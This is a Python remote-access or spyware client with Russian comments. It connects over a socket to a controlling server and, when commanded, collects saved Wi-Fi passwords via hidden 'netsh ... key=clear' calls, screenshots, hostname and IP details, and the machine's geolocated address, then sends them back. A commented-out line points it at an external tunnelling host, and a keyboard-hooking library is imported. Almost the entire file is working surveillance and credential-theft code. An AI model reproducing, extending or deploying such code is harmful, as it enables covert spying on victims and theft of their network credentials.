import socket
import threading
import subprocess
import time
from mss import mss
from requests import get
import os
import json
from geopy.geocoders import Nominatim
import geocoder
import pynput.keyboard
import re
#asd
def locale(client_socket):
    # initialize the Nominatim object
    Nomi_locator = Nominatim(user_agent="My App")

    my_location = geocoder.ip('me')

    # my latitude and longitude coordinates
    latitude = my_location.geojson['features'][0]['properties']['lat']
    longitude = my_location.geojson['features'][0]['properties']['lng']

    # get the location
    location = Nomi_locator.reverse(f"{latitude}, {longitude}")
    print(location)
    message = f".{location}"
    client_socket.send(message.encode('utf-8'))

def screen(client_socket):
    message = ".img"
    client_socket.send(message.encode('utf-8'))
    with mss() as sct:
        sct.shot()
    image_size = os.path.getsize('monitor-1.png')
    size_bytes = image_size.to_bytes(4, byteorder='big')
    client_socket.send(size_bytes)
    print(size_bytes)

    with open('monitor-1.png', 'rb') as file:
        while True:
            data = file.read(1024)
            if not data:
                break
            client_socket.send(data)
    # client_socket.close()

    # start_client()


# def wifi(client_socket):
#     # Создаем запрос в командной строке netsh wlan show profiles, декодируя его по кодировке в самом ядре
#     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'],stderr=subprocess.DEVNULL).decode('utf-8').split('\n')
#     # Создаем список всех названий всех профилей сети (имена сетей)
#     Ws = [line.split(':')[1][1:-1] for line in data if "Все профили пользователей" in line]
#     # Для каждого имени...
#     for Wi in Ws:
#         # ...вводим запрос netsh wlan show profile [ИМЯ_Сети] key=clear
#         results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', Wi, 'key=clear']).decode('utf-8').split('\n')
#         # Забираем ключ
#         results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]
#         # Пытаемся его вывести в командной строке, отсекая все ошибки
#         try:
#             time.sleep(0.3)
#             message = f'.Имя сети: {Wi}, Пароль: {results[0]}'
#             client_socket.send(message.encode('utf-8'))
#         except IndexError:
#             time.sleep(0.3)
#             message = f'.Имя сети: {Wi}, Пароль: нету'
#             client_socket.send(message.encode('utf-8'))

def wifi(client_socket):
    # Создаем запрос в командной строке netsh wlan show profiles, декодируя его по кодировке в самом ядре
    data = subprocess.check_output(
        ['netsh', 'wlan', 'show', 'profiles'],
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW  # Убираем окно консоли
    ).decode('utf-8').split('\n')

    # Создаем список всех названий всех профилей сети (имена сетей)
    Ws = [line.split(':')[1][1:-1] for line in data if "Все профили пользователей" in line]

    # Для каждого имени...
    for Wi in Ws:
        # ...вводим запрос netsh wlan show profile [ИМЯ_Сети] key=clear
        results = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profile', Wi, 'key=clear'],
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW  # Убираем окно консоли
        ).decode('utf-8').split('\n')

        # Забираем ключ
        results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]

        # Пытаемся его вывести в командной строке, отсекая все ошибки
        try:
            time.sleep(0.3)
            message = f'.Имя сети: {Wi}, Пароль: {results[0]}'
            client_socket.send(message.encode('utf-8'))
        except IndexError:
            time.sleep(0.3)
            message = f'.Имя сети: {Wi}, Пароль: нету'
            client_socket.send(message.encode('utf-8'))


def system(client_socket):
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    public_ip = get('http://api.ipify.org').text
    message = f'.Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}'
    client_socket.send(message.encode('utf-8'))


def obr(message,client_socket):
  temp_mes = message.split(": ",1)[1]
  print(temp_mes)
  if temp_mes[:1] == "/":
    match temp_mes:
        case "/wifi": wifi(client_socket)
        case "/system": system(client_socket)
        case "/screen": screen(client_socket)
        case "/locale": locale(client_socket)
        case _:
            message = ".Неизвесная команда"
            client_socket.send(message.encode('utf-8'))
  elif temp_mes[:1] == ".":
      receive_messages(client_socket)
  else:
    print(message)

def receive_messages(client_socket):
  while True:
      message = client_socket.recv(1024).decode('utf-8')
      if message:
        obr(message,client_socket)
      else:
        break

def start_client():
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  #client.connect(('tcp.cloudpub.ru', 35581))
  client.connect(('localhost', 9090))

  # name = input("Введите ваше имя: ")
  name = "Client"
  client.send(name.encode('utf-8'))
  # print(f"Теперь вас зовут {name}")

  thread = threading.Thread(target=receive_messages, args=(client,))
  thread.start()

#  while True:
#    message = input()
#    if message.lower() == 'exit':
#      break
#    client.send(message.encode('utf-8'))

#  client.close()



if __name__ == "__main__":
    start_client()
